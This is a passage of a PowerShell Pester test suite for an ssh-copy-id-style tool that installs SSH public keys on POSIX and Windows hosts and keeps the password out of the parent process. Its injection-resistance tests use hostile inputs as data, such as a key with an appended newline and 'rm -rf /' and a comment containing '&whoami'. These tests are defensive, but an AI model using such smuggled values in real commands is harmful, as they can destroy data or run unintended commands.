            { New-PosixInstallCommand -PublicKey $script:oneKey -Transport Direct } |
                Should-Throw -ExceptionMessage '*escapes quotes*'
        }

        It 'resolves Auto to Direct on a client that escapes quotes' {
            Mock Test-NativeQuotingSafe { $true }

            New-PosixInstallCommand -PublicKey $script:oneKey -Transport Auto |
                Should-MatchString "^exec sh -c '"
        }

        It 'resolves Auto to Encoded on a client that does not' {
            # No base64 dependency is imposed on the target unless the client needs it
            Mock Test-NativeQuotingSafe { $false }

            New-PosixInstallCommand -PublicKey $script:oneKey -Transport Auto |
                Should-MatchString '^echo [A-Za-z0-9+/=]+ \| base64 -d \| sh$'
        }

        It 'passes keys as positional parameters in the direct form' {
            Mock Test-NativeQuotingSafe { $true }

            $command = New-PosixInstallCommand -Transport Direct -PublicKey @(
                'ssh-ed25519 AAAAONE first@ws'
                "ssh-ed25519 AAAATWO o'brien@ws"
            )

            $expectedArgs = "sh 'ssh-ed25519 AAAAONE first@ws' " +
                "'ssh-ed25519 AAAATWO o'\''brien@ws'"

            $command | Should-MatchString ([regex]::Escape('for k in "$@"; do addkey "$k"; done'))
            $command | Should-MatchString ([regex]::Escape($expectedArgs))
        }

        It 'traces the encoded body under set -x, and only when asked' {
            # ssh-copy-id -x. It must be the first statement or it does not cover the body.
            Get-DecodedPosixScript -Command (
                New-PosixInstallCommand -PublicKey $script:oneKey -Transport Encoded -Trace) |
                Should-MatchString '^set -x'

            Get-OneKeyBody | Should-NotMatchString 'set -x'
        }

        It 'traces the direct body under set -x, and only when asked' {
            Mock Test-NativeQuotingSafe { $true }

            New-PosixInstallCommand -PublicKey $script:oneKey -Transport Direct -Trace |
                Should-MatchString ([regex]::Escape("exec sh -c 'set -x; "))

            New-PosixInstallCommand -PublicKey $script:oneKey -Transport Direct |
                Should-NotMatchString 'set -x'
        }

        It 'keeps key text out of the body in the direct form' {
            Mock Test-NativeQuotingSafe { $true }

            # The keys live after the closing quote, as arguments, not inside the script
            $command = New-PosixInstallCommand -PublicKey $script:oneKey -Transport Direct
            $body = $command.Substring($command.IndexOf("'") + 1)
            $body = $body.Substring(0, $body.IndexOf("' sh "))

            $body | Should-NotMatchString ([regex]::Escape($script:oneKey[0]))
        }
    }

    Context 'Command line safety' -Tag 'Security' {

        It 'puts nothing but base64 on the remote command line' {
            # Windows PowerShell 5.1 does not escape embedded double quotes when it builds a
            # native command line, so a body containing "$f" arrived with its quoting
            # shredded and the remote shell hung waiting for a terminator that never came.
            $command = New-PosixInstallCommand -PublicKey $script:oneKey -Transport Encoded

            ($command -split ' ')[1] | Should-MatchString '^[A-Za-z0-9+/=]+$'
            $command | Should-NotMatchString '"'
            $command | Should-NotMatchString "'"
        }

        It 'uses a pipeline every login shell can parse' {
            # csh, tcsh and fish all reject "k=$(...)" but all handle a plain pipeline, and
            # the decoded body is executed by sh whatever the account's shell is
            New-PosixInstallCommand -PublicKey $script:oneKey -Transport Encoded |
                Should-MatchString '^echo [A-Za-z0-9+/=]+ \| base64 -d \| sh$'
        }

        It 'carries no key material in the clear' {
            New-PosixInstallCommand -PublicKey $script:oneKey -Transport Encoded |
                Should-NotMatchString ([regex]::Escape($script:oneKey[0]))
        }

        It 'escapes a single quote in a key comment rather than ending the literal' {
            Get-DecodedPosixScript -Command (
                New-PosixInstallCommand -PublicKey @("ssh-ed25519 AAAAKEY o'brien@ws") -Transport Encoded) |
                Should-MatchString ([regex]::Escape("addkey 'ssh-ed25519 AAAAKEY o'\''brien@ws'"))
        }

        It 'refuses a multi-line public key instead of escaping it' {
            { New-PosixInstallCommand -PublicKey @("ssh-ed25519 AAAA a@b`nrm -rf /") } |
                Should-Throw -ExceptionMessage '*single line*'
        }
    }

    Context 'Core Functionality' {

        It 'installs into the profile authorized_keys file' {
            # $HOME rather than ~, because sh does not expand a tilde inside double quotes
            Get-OneKeyBody | Should-MatchString '\$HOME/\.ssh/authorized_keys'
        }

        It 'reports the sentinels the verification step looks for' {
            $body = Get-OneKeyBody

            $body | Should-MatchString 'KEY_INSTALLED_OK'
            $body | Should-MatchString 'KEY_FILE='
            $body | Should-MatchString 'KEYS_ADDED='
        }

        It 'strips carriage returns so a Windows client cannot taint the file' {
            Get-OneKeyBody | Should-MatchString 'tr -d'
        }

        It 'sets the permissions sshd insists on' {
            $body = Get-OneKeyBody

            $body | Should-MatchString 'chmod 700 "\$d"'
            $body | Should-MatchString 'chmod 600 "\$f"'
        }

        It 'relabels for SELinux, which ssh-copy-id does and this script used to skip' {
            # A correctly-permissioned authorized_keys with the wrong context is denied to
            # sshd, which is routine after a home directory is restored or migrated
            $body = Get-OneKeyBody

            $body | Should-MatchString 'command -v restorecon'
            $body | Should-MatchString 'restorecon -F'
        }

        It 'terminates the last line before appending so it cannot splice two keys together' {
            Get-OneKeyBody | Should-MatchString 'tail -c 1'
        }

        It 'emits one call per key, so a whole agent installs in one session' {
            $body = Get-DecodedPosixScript -Command (New-PosixInstallCommand -Transport Encoded -PublicKey @(
                    'ssh-ed25519 AAAAONE first@ws'
                    'ssh-ed25519 AAAATWO second@ws'
                ))

            $body | Should-MatchString ([regex]::Escape("addkey 'ssh-ed25519 AAAAONE first@ws'"))
            $body | Should-MatchString ([regex]::Escape("addkey 'ssh-ed25519 AAAATWO second@ws'"))
        }

        It 'puts no separator after a shell keyword' {
            # "if X; then; ..." is a syntax error, which joining a list with "; " produced
            Get-OneKeyBody | Should-NotMatchString '\b(then|else|do)\s*;'
        }
    }

    Context 'Generated shell syntax' -Tag 'Integration' {

        It 'produces a body a POSIX shell accepts: <Variant>' -Skip:$script:SkipWithoutShell -ForEach @(
            @{ Variant = 'default'; RemotePath = '' }
            @{ Variant = 'custom path'; RemotePath = '/etc/ssh/authorized_keys/jeff' }
            @{ Variant = 'tilde path'; RemotePath = '~/.ssh/other_keys' }
            @{ Variant = 'quote in comment'; RemotePath = '' }
        ) {
            $keys = if ($Variant -eq 'quote in comment') {
                @("ssh-ed25519 AAAAKEY o'brien@ws", 'ssh-ed25519 BBBB second@ws')
            }
            else {
                @('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITESTKEY jeff@ws')
            }

            $command = if ($RemotePath) {
                New-PosixInstallCommand -PublicKey $keys -RemotePath $RemotePath -Transport Encoded
            }
            else {
                New-PosixInstallCommand -PublicKey $keys -Transport Encoded
            }

            # Decode and parse the body itself. Checking the command line only proves the
            # base64 is well formed, which is precisely the check that missed the last bug.
            $body = [System.Text.Encoding]::UTF8.GetString(
                [System.Convert]::FromBase64String(($command -split ' ')[1]))

            $bodyPath = Join-Path $TestDrive "body-$([guid]::NewGuid().ToString('N')).sh"
            [System.IO.File]::WriteAllText($bodyPath, $body, [System.Text.UTF8Encoding]::new($false))

            $output = & $script:PosixShell -n $bodyPath 2>&1
            $exit = $LASTEXITCODE

            $exit | Should-Be 0 -Because "sh -n reported: $($output -join ' ')"
        }

        It 'produces a direct body a POSIX shell accepts: <Variant>' -ForEach @(
            @{ Variant = 'default'; RemotePath = '' }
            @{ Variant = 'custom path'; RemotePath = '/etc/ssh/authorized_keys/jeff' }
            @{ Variant = 'tilde path'; RemotePath = '~/.ssh/other_keys' }
            @{ Variant = 'multi key'; RemotePath = '' }
        ) -Skip:$script:SkipWithoutShell {
            # The direct body is a semicolon-joined single line containing a function
            # definition and a for loop - the same shape that once hid a stray separator
            # after "then". It needs the same parse check as the encoded body.
            #
            # Mocked rather than skipped on a quote-unsafe client: the body's syntax is what
            # is under test here, and that does not depend on how this host escapes it.
            Mock Test-NativeQuotingSafe { $true }

            $keys = if ($Variant -eq 'multi key') {
                @('ssh-ed25519 AAAAONE first@ws', "ssh-ed25519 AAAATWO o'brien@ws")
            }
            else {
                @('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITESTKEY jeff@ws')
            }

            $command = if ($RemotePath) {
                New-PosixInstallCommand -PublicKey $keys -RemotePath $RemotePath -Transport Direct
            }
            else {
                New-PosixInstallCommand -PublicKey $keys -Transport Direct
            }

            # Unwrap exec sh -c '<body>' sh 'key' ... - the body ends at the quote before " sh "
            $start = $command.IndexOf("'") + 1
            $body = $command.Substring($start, $command.IndexOf("' sh ") - $start)

            $bodyPath = Join-Path $TestDrive "direct-$([guid]::NewGuid().ToString('N')).sh"
            [System.IO.File]::WriteAllText($bodyPath, $body, [System.Text.UTF8Encoding]::new($false))

            $output = & $script:PosixShell -n $bodyPath 2>&1
            $exit = $LASTEXITCODE

            $exit | Should-Be 0 -Because "sh -n reported: $($output -join ' ')"
        }
    }

    Context 'Custom authorized_keys path' {

        It 'installs into an explicitly requested path' {
            Get-OneKeyBody -RemotePath '/etc/ssh/authorized_keys/jeff' |
                Should-MatchString ([regex]::Escape('f="/etc/ssh/authorized_keys/jeff"'))
        }

        It 'translates a tilde, which sh does not expand inside double quotes' {
            Get-OneKeyBody -RemotePath '~/.ssh/other_keys' |
                Should-MatchString ([regex]::Escape('f="$HOME/.ssh/other_keys"'))
        }

        It 'leaves a shared directory alone rather than locking other accounts out' {
            # 0700 on /etc/ssh/authorized_keys would deny every other user their own keys
            $body = Get-OneKeyBody -RemotePath '/etc/ssh/authorized_keys/jeff'

            $body | Should-NotMatchString 'chmod 700'
            $body | Should-MatchString 'chmod 600 "\$f"'
        }
    }
}


Describe 'New-WindowsInstallCommand' -Tag 'Unit' {

    BeforeAll {
        $script:testKey = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITESTKEY jeff@ws'

        function Get-DecodedRemoteScript {
            param([string]$Command)

            $encoded = ($Command -split ' ')[-1]
            return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
        }
    }

    Context 'Remote tracing' {

        It 'traces the remote script when asked, and leaves it alone otherwise' {
            # The Windows half of ssh-copy-id -x. The untraced payload must be unchanged:
            # the token is replaced with an empty line, which the compaction then removes.
            Get-DecodedRemoteScript -Command (
                New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto' -Trace) |
                Should-MatchString ([regex]::Escape('Set-PSDebug -Trace 1'))

            Get-DecodedRemoteScript -Command (
                New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto') |
                Should-NotMatchString 'Set-PSDebug'
        }

        It 'leaves no placeholder behind when tracing is off' {
            Get-DecodedRemoteScript -Command (
                New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto') |
                Should-NotMatchString '__TRACE__'
        }

        It 'still fits the cmd.exe command line with tracing on' {
            # Tracing costs characters against the same 8191 budget an RSA 4096 key spends
            $rsaKey = 'ssh-rsa ' + ('A' * 716) + ' jeff@ws'

            (New-WindowsInstallCommand -PublicKey $rsaKey -KeyLocation 'Auto' -Trace).Length |
                Should-BeLessThan 8000
        }
    }

    Context 'Core Functionality' {

        It 'invokes powershell.exe so the DefaultShell setting cannot matter' {
            $command = New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto'

            $command | Should-MatchString '^powershell -NoProfile -NonInteractive'
            $command | Should-MatchString '-EncodedCommand '
        }

        It 'pins stdout to plain text' {
            New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto' |
                Should-MatchString '-OutputFormat Text'
        }

        It 'silences progress, which -OutputFormat Text does not cover' {
            # Observed on a real target: progress records still arrived as CLIXML markup
            # despite -OutputFormat Text, because that switch governs stdout only
            $script = Get-DecodedRemoteScript -Command (
                New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto')

            $script | Should-MatchString "ProgressPreference = 'SilentlyContinue'"
        }

        It 'produces a remote script that parses as PowerShell' {
            $command = New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto'
            $parseErrors = $null

            $null = [System.Management.Automation.Language.Parser]::ParseInput(
                (Get-DecodedRemoteScript -Command $command), [ref]$null, [ref]$parseErrors)

            Should-BeCollection -Actual @($parseErrors) -Count 0 `
                -Because 'a malformed remote script fails obscurely on the far side'
        }

        It 'carries the public key it was given' {
            $command = New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto'
            $script = Get-DecodedRemoteScript -Command $command

            $script | Should-MatchString ([regex]::Escape("`$keys = @('$script:testKey')"))
        }

        It 'carries every key it was given, for a whole agent in one session' {
            $command = New-WindowsInstallCommand -KeyLocation 'Auto' -PublicKey @(
                'ssh-ed25519 AAAAONE first@ws'
                'ssh-ed25519 AAAATWO second@ws'
            )
            $script = Get-DecodedRemoteScript -Command $command

            $script | Should-MatchString ([regex]::Escape(
                    "`$keys = @('ssh-ed25519 AAAAONE first@ws','ssh-ed25519 AAAATWO second@ws')"))
            $script | Should-MatchString ([regex]::Escape('foreach ($k in $keys)'))
        }

        It 'reports how many entries it appended' {
            $script = Get-DecodedRemoteScript -Command (
                New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto')

            $script | Should-MatchString 'KEYS_ADDED='
        }

        It 'reports the sentinel the verification step looks for' {
            $command = New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto'

            (Get-DecodedRemoteScript -Command $command) | Should-MatchString 'KEY_INSTALLED_OK'
        }

        It 'targets both candidate key files so either can be selected remotely' {
            $script = Get-DecodedRemoteScript -Command (
                New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto')

            $script | Should-MatchString 'administrators_authorized_keys'
            $script | Should-MatchString '\.ssh\\authorized_keys'
        }

        It 'resolves <KeyLocation> to <Expected> at build time' -ForEach @(
            @{ KeyLocation = 'Auto'; Expected = '$inAdminGroup' }
            @{ KeyLocation = 'Administrators'; Expected = '$true' }
            @{ KeyLocation = 'UserProfile'; Expected = '$false' }
        ) {
            # Deciding here rather than shipping a switch keeps the remote script inside
            # cmd.exe's 8191-character limit, which an RSA 4096 key already strains
            $script = Get-DecodedRemoteScript -Command (
                New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation $KeyLocation)

            $script | Should-MatchString ([regex]::Escape("`$useAdminFile = $Expected"))
        }

        It 'resolves administrator membership by SID, as sshd does' {
            $script = Get-DecodedRemoteScript -Command (
                New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto')

            # IsInRole() would report false under the filtered token an ssh session gets
            $script | Should-MatchString 'S-1-5-32-544'
            $script | Should-NotMatchString 'IsInRole'
        }
    }

    Context 'Command length' {

        It 'stays inside the cmd.exe limit for an ed25519 key' {
            $command = New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto'

            $command.Length | Should-BeLessThan 8191
        }

        It 'stays inside the cmd.exe limit for an RSA 4096 key' {
            # An RSA 4096 public key is roughly 740 characters, the largest realistic input
            $rsaKey = 'ssh-rsa {0} jeff@ws' -f ('A' * 740)

            $command = New-WindowsInstallCommand -PublicKey $rsaKey -KeyLocation 'Auto'

            $command.Length | Should-BeLessThan 8191
        }

        It 'refuses to emit a command cmd.exe would silently truncate' {
            $oversized = 'ssh-rsa {0} jeff@ws' -f ('A' * 4000)

            { New-WindowsInstallCommand -PublicKey $oversized -KeyLocation 'Auto' } |
                Should-Throw -ExceptionMessage '*cmd.exe cannot receive it*'
        }
    }

    Context 'Custom authorized_keys path' {

        It 'installs into an explicitly requested path' {
            $script = Get-DecodedRemoteScript -Command (
                New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto' `
                    -RemotePath 'D:\keys\authorized_keys')

            $script | Should-MatchString ([regex]::Escape("`$keyFile = 'D:\keys\authorized_keys'"))
        }

        It 'disables the profile fallback, which would ignore what was asked for' {
            $script = Get-DecodedRemoteScript -Command (
                New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto' `
                    -RemotePath 'D:\keys\authorized_keys')

            $script | Should-MatchString ([regex]::Escape('if (-not ($false)) { throw }'))
        }

        It 'keeps the fallback when no path was requested' {
            $script = Get-DecodedRemoteScript -Command (
                New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto')

            $script | Should-MatchString ([regex]::Escape('if (-not ($useAdminFile)) { throw }'))
        }
    }

    Context 'Appending to an existing file' {

        It 'terminates the last line before appending so it cannot splice two keys together' {
            $script = Get-DecodedRemoteScript -Command (
                New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto')

            $script | Should-MatchString ([regex]::Escape('[IO.File]::AppendAllText($Path,'))
        }
    }

    Context 'Injection resistance' -Tag 'Security' {

        It 'escapes a single quote in the key comment rather than ending the literal' {
            # The key is embedded in a single-quoted PowerShell literal; doubling is the
            # escape that context defines, and it cannot be broken out of
            $awkward = "ssh-ed25519 AAAAKEY o'brien@ws"

            $script = Get-DecodedRemoteScript -Command (
                New-WindowsInstallCommand -PublicKey $awkward -KeyLocation 'Auto')

            $script | Should-MatchString ([regex]::Escape("@('ssh-ed25519 AAAAKEY o''brien@ws')"))

            $parseErrors = $null
            $null = [System.Management.Automation.Language.Parser]::ParseInput(
                $script, [ref]$null, [ref]$parseErrors)

            Should-BeCollection -Actual @($parseErrors) -Count 0 `
                -Because 'the quote must not terminate the string literal'
        }

        It 'refuses a multi-line public key instead of escaping it' {
            # Escaping cannot save a newline: it would split the statement, and the
            # comment-stripping compaction would then mangle whatever landed on line two
            { New-WindowsInstallCommand -PublicKey "ssh-ed25519 AAAAKEY a@b`nssh-rsa BBBB c@d" `
                    -KeyLocation 'Auto' } |
                Should-Throw -ExceptionMessage '*must be a single line*'
        }

        It 'refuses a multi-line remote path' {
            { New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto' `
                    -RemotePath "C:\a`nC:\b" } |
                Should-Throw -ExceptionMessage '*must be a single line*'
        }

        It 'exposes nothing but base64 on the remote command line' {
            $command = New-WindowsInstallCommand -PublicKey $script:testKey -KeyLocation 'Auto'
            $payload = ($command -split ' ')[-1]

            $payload | Should-MatchString '^[A-Za-z0-9+/=]+$' `
                -Because 'the far-side shell must have nothing left to reinterpret'
            $command | Should-NotMatchString ([regex]::Escape($script:testKey))
        }

        It 'keeps a shell metacharacter in the comment inside the encoded payload' {
            # The comment is validated locally, but the encoding is what makes it safe
            $awkwardKey = 'ssh-ed25519 AAAAKEY jeff&whoami@ws'

            $command = New-WindowsInstallCommand -PublicKey $awkwardKey -KeyLocation 'Auto'

            $command | Should-NotMatchString '&'
        }
    }
}


Describe 'New-SshAskPassHelper' -Tag 'Unit' {

    BeforeAll {
        $script:secret = 'correct-horse-battery-staple'

        # Built a character at a time rather than with ConvertTo-SecureString -AsPlainText.
        # The result is identical, but the plaintext form is the pattern security scanners
        # flag, and a test file is a poor place to demonstrate it.
        $secureSecret = [System.Security.SecureString]::new()
        foreach ($character in $script:secret.ToCharArray()) {
            $secureSecret.AppendChar($character)
        }
        $secureSecret.MakeReadOnly()

        $script:testCredential = [System.Management.Automation.PSCredential]::new(
            'root', $secureSecret)
    }

    AfterEach {
        # Never leave a password behind in this session, even if an assertion failed
        if ($script:helper) {
            Remove-SshAskPassHelper -Helper $script:helper
            $script:helper = $null
        }
    }

    Context 'Credential handling' -Tag 'Security' {

        It 'writes no password to disk' {
            # The whole point of the environment-variable indirection. A helper carrying the
            # password would outlive the run in the temp directory and in any backup of it.
            $script:helper = New-SshAskPassHelper -Credential $script:testCredential

            $onDisk = Get-Content -LiteralPath $script:helper.Path -Raw
            $onDisk | Should-NotMatchString ([regex]::Escape($script:secret))
            $onDisk | Should-MatchString ([regex]::Escape($script:helper.VariableName))
        }

        It 'sets no environment variable on this process' {
            # The core of the isolation. If the password were placed here it would be
            # inherited by every child the run starts - ssh-keygen, icacls, sftp - and
            # readable from this process for as long as the run lasted.
            $script:helper = New-SshAskPassHelper -Credential $script:testCredential

            [Environment]::GetEnvironmentVariable($script:helper.VariableName, 'Process') |
                Should-BeFalsy
            @(Get-ChildItem Env: | Where-Object { $_.Value -eq $script:secret }) |
                Should-BeCollection -Count 0
        }

        It 'leaves any SSH_ASKPASS the caller already had alone' {
            [Environment]::SetEnvironmentVariable('SSH_ASKPASS', 'C:\mine\askpass.exe', 'Process')
            try {
                $script:helper = New-SshAskPassHelper -Credential $script:testCredential

                # Not saved-and-restored - simply never touched, which is a weaker promise
                # to break
                [Environment]::GetEnvironmentVariable('SSH_ASKPASS', 'Process') |
                    Should-Be 'C:\mine\askpass.exe'
            }
            finally {
                [Environment]::SetEnvironmentVariable('SSH_ASKPASS', $null, 'Process')
            }
        }

        It 'keeps the credential wrapped rather than storing plaintext on the descriptor' {
            $script:helper = New-SshAskPassHelper -Credential $script:testCredential

            $script:helper.Credential | Should-HaveType ([System.Management.Automation.PSCredential])
            "$($script:helper | ConvertTo-Json -Compress)" |
                Should-NotMatchString ([regex]::Escape($script:secret))
        }

        It 'removes the helper script when the helper is removed' {
            $helper = New-SshAskPassHelper -Credential $script:testCredential
            Remove-SshAskPassHelper -Helper $helper

            Test-Path -LiteralPath $helper.Path | Should-BeFalse
            Test-Path -LiteralPath $helper.Directory | Should-BeFalse
        }

        It 'uses a fresh variable name each time, so runs cannot read each other' {
            $first = New-SshAskPassHelper -Credential $script:testCredential
            Remove-SshAskPassHelper -Helper $first
            $second = New-SshAskPassHelper -Credential $script:testCredential
            Remove-SshAskPassHelper -Helper $second

            $first.VariableName | Should-NotBe $second.VariableName
        }

        It 'never writes the password to the environment under -WhatIf' {
            $result = New-SshAskPassHelper -Credential $script:testCredential -WhatIf

            $result | Should-BeNull
        }
    }

    Context 'Core Functionality' {

        It 'emits a helper cmd.exe answers correctly when the variable is in ITS environment' {
            # This is what ssh does: run the helper and read one line of stdout. The value
            # has to come from the child's own environment, because the parent never has it.
            $script:helper = New-SshAskPassHelper -Credential $script:testCredential

            $startInfo = [System.Diagnostics.ProcessStartInfo]::new()
            $startInfo.FileName = $env:ComSpec
            $startInfo.Arguments = '/c "' + $script:helper.Path + '"'
            $startInfo.UseShellExecute = $false
            $startInfo.RedirectStandardOutput = $true
            $startInfo.EnvironmentVariables[$script:helper.VariableName] = $script:secret

            $process = [System.Diagnostics.Process]::new()
            $process.StartInfo = $startInfo
            try {
                $null = $process.Start()
                $answered = $process.StandardOutput.ReadToEnd()
                $process.WaitForExit()
            }
            finally {
                $process.Dispose()
            }

            "$answered".Trim() | Should-Be $script:secret
        }
    }
}


Describe 'ConvertTo-NativeArgumentString' -Tag 'Unit' {

    Context 'Core Functionality' {

        It 'leaves an argument needing no quoting alone: <Raw>' -ForEach @(
            @{ Raw = '-o'; Expected = '-o' }
            @{ Raw = 'StrictHostKeyChecking=accept-new'; Expected = 'StrictHostKeyChecking=accept-new' }
            @{ Raw = 'C:\Users\jeff\.ssh\id_ed25519'; Expected = 'C:\Users\jeff\.ssh\id_ed25519' }
        ) {
            ConvertTo-NativeArgumentString -ArgumentList @($Raw) | Should-Be $Expected
        }

        It 'quotes an argument containing a space' {
            ConvertTo-NativeArgumentString -ArgumentList @('C:\Program Files\key') |
                Should-Be '"C:\Program Files\key"'
        }

        It 'doubles the backslashes that precede a closing quote' {
            # "C:\dir\" would otherwise escape its own closing quote and swallow the rest
            ConvertTo-NativeArgumentString -ArgumentList @('C:\my dir\') |
                Should-Be '"C:\my dir\\"'
        }

        It 'escapes an embedded double quote without doubling ordinary backslashes' {
            ConvertTo-NativeArgumentString -ArgumentList @('a\b "c" d') |
                Should-Be '"a\b \"c\" d"'
        }

        It 'renders an empty argument as an empty quoted string' {
            ConvertTo-NativeArgumentString -ArgumentList @('', 'x') | Should-Be '"" x'
        }
    }

    Context 'Agreement with the reference implementation' -Tag 'Security' {

        # ArgumentList is .NET Core only, so this can only run where both exist. It is the
        # test that matters most: on Windows PowerShell 5.1 the hand-built string is the ONLY
        # thing standing between a public key and being split into fragments on the wire.
        It 'produces the same argv as ProcessStartInfo.ArgumentList: <Name>' -ForEach @(
            @{ Name = 'plain ssh options'
                Arguments = @('-o', 'StrictHostKeyChecking=yes', '-p', '22', 'root@host')
            }
            @{ Name = 'path with spaces'
                Arguments = @('-i', 'C:\Program Files\keys\id_ed25519', 'root@host')
            }
            @{ Name = 'trailing backslash'
                Arguments = @('-i', 'C:\my dir\', 'root@host')
            }
            @{ Name = 'the direct POSIX transport, quotes and all'
                Arguments = @('root@host', ('exec sh -c ''f="$HOME/.ssh/authorized_keys"; ' +
                        'echo "$1" >> "$f"'' sh ''ssh-ed25519 AAAA jeff@ws'''))
            }
            @{ Name = 'the Windows encoded command'
                Arguments = @('admin@host', 'powershell -NoProfile -EncodedCommand JABlAHIAcgA=')
            }
            @{ Name = 'embedded double quotes'
                Arguments = @('root@host', 'echo "hello world" && echo \"x\"')
            }
        ) {
            $startInfo = [System.Diagnostics.ProcessStartInfo]::new()
            if ($startInfo.PSObject.Properties.Name -notcontains 'ArgumentList') {
                Set-ItResult -Skipped -Because 'ProcessStartInfo.ArgumentList needs .NET Core'
                return
            }

            $echo = Join-Path $TestDrive "echoargs-$([guid]::NewGuid().ToString('N')).ps1"
            Set-Content $echo '$args | ForEach-Object { "[$_]" }' -Encoding utf8
            $shell = (Get-Process -Id $PID).Path
            $prefix = @('-NoProfile', '-NonInteractive', '-File', $echo)

            function Get-ChildArgv {
                param([System.Diagnostics.ProcessStartInfo]$StartInfo)

                $StartInfo.FileName = $shell
                $StartInfo.UseShellExecute = $false
                $StartInfo.RedirectStandardOutput = $true
                $process = [System.Diagnostics.Process]::new()
                $process.StartInfo = $StartInfo
                try {
                    $null = $process.Start()
                    $text = $process.StandardOutput.ReadToEnd()
                    $process.WaitForExit()
                }
                finally {
                    $process.Dispose()
                }
                return $text
            }

            # Reference: let .NET do the quoting
            $viaList = [System.Diagnostics.ProcessStartInfo]::new()
            foreach ($argument in ($prefix + $Arguments)) { $viaList.ArgumentList.Add($argument) }
            $expected = Get-ChildArgv -StartInfo $viaList

            # Ours: one flat string, the 5.1 path
            $viaString = [System.Diagnostics.ProcessStartInfo]::new()
            $viaString.Arguments = ConvertTo-NativeArgumentString -ArgumentList ($prefix + $Arguments)
            $actual = Get-ChildArgv -StartInfo $viaString

            $actual | Should-Be $expected
        }
    }
}


Describe 'Invoke-SshClient' -Tag 'Unit' {

    BeforeAll {
        $script:isolationSecret = 'isolation-probe-secret'
        $secure = [System.Security.SecureString]::new()
        foreach ($character in $script:isolationSecret.ToCharArray()) { $secure.AppendChar($character) }
        $secure.MakeReadOnly()
        $script:isolationCredential = [System.Management.Automation.PSCredential]::new('root', $secure)
        $script:shell = (Get-Process -Id $PID).Path
    }

    Context 'Credential isolation' -Tag 'Security' {

        It 'gives the secret to the child and to nothing else' {
            $helper = New-SshAskPassHelper -Credential $script:isolationCredential
            try {
                $script = Join-Path $TestDrive 'readenv.ps1'
                Set-Content $script "`$env:$($helper.VariableName)" -Encoding utf8

                $run = Invoke-SshClient -FilePath $script:shell `
                    -ArgumentList @('-NoProfile', '-NonInteractive', '-File', $script) `
                    -AskPass $helper

                # The child received it...
                ($run.Output -join '').Trim() | Should-Be $script:isolationSecret

                # ...and this process still has not
                [Environment]::GetEnvironmentVariable($helper.VariableName, 'Process') |
                    Should-BeFalsy
            }
            finally {
                Remove-SshAskPassHelper -Helper $helper
            }
        }

        It 'passes nothing to a child launched without an askpass helper' {
            $script = Join-Path $TestDrive 'readenv2.ps1'
            Set-Content $script '$env:SSH_ASKPASS' -Encoding utf8

            $run = Invoke-SshClient -FilePath $script:shell `
                -ArgumentList @('-NoProfile', '-NonInteractive', '-File', $script)

            ($run.Output -join '').Trim() | Should-BeFalsy
        }
    }

    Context 'Stream handling' {

        It 'does not deadlock when the child floods both stdout and stderr' {
            # Reading one stream to completion while the other fills its pipe buffer is the
            # classic redirected-child deadlock. ssh writes diagnostics to stderr and
            # sentinels to stdout, so both are always in play.
            $helper = New-SshAskPassHelper -Credential $script:isolationCredential
            try {
                $flood = Join-Path $TestDrive 'flood.ps1'
                Set-Content $flood @'
1..4000 | ForEach-Object { 'o' * 200 }
1..4000 | ForEach-Object { [Console]::Error.WriteLine('e' * 200) }
'@ -Encoding utf8

                $run = Invoke-SshClient -FilePath $script:shell `
                    -ArgumentList @('-NoProfile', '-NonInteractive', '-File', $flood) `
                    -AskPass $helper

                # Roughly 1.6 MB across the two pipes, far past the 64 KB buffer
                @($run.Output | Where-Object { $_ -match '^o+$' }) | Should-BeCollection -Count 4000
                @($run.Output | Where-Object { $_ -match '^e+$' }) | Should-BeCollection -Count 4000
            }
            finally {
                Remove-SshAskPassHelper -Helper $helper
            }
        }

        It 'reports the child exit code' {
            $helper = New-SshAskPassHelper -Credential $script:isolationCredential
            try {
                $failing = Join-Path $TestDrive 'failing.ps1'
                Set-Content $failing 'exit 42' -Encoding utf8

                $run = Invoke-SshClient -FilePath $script:shell `
                    -ArgumentList @('-NoProfile', '-NonInteractive', '-File', $failing) `
                    -AskPass $helper

                $run.ExitCode | Should-Be 42
            }
            finally {
                Remove-SshAskPassHelper -Helper $helper
            }
        }
    }
}


Describe 'Merge-AuthorizedKeyContent' -Tag 'Unit' {

    Context 'Core Functionality' {

        It 'appends a key to an empty file' {
            $merge = Merge-AuthorizedKeyContent -ExistingContent '' -PublicKey @('ssh-ed25519 AAAA a@b')

            $merge.KeysAdded | Should-Be 1
            $merge.Content | Should-Be "ssh-ed25519 AAAA a@b`n"
        }

        It 'terminates an unterminated last line instead of splicing onto it' {
            # sftp mode rewrites the whole file, so this is the local equivalent of the
            # tail -c 1 guard the shell command performs remotely
            $merge = Merge-AuthorizedKeyContent -ExistingContent 'ssh-rsa OLD admin@old' `
                -PublicKey @('ssh-ed25519 NEW a@b')

            $merge.Content | Should-Be "ssh-rsa OLD admin@old`nssh-ed25519 NEW a@b`n"
            $merge.KeysAdded | Should-Be 1
        }

        It 'adds nothing when every key is already present' {
            $existing = "ssh-rsa OLD admin@old`nssh-ed25519 NEW a@b`n"

            $merge = Merge-AuthorizedKeyContent -ExistingContent $existing `
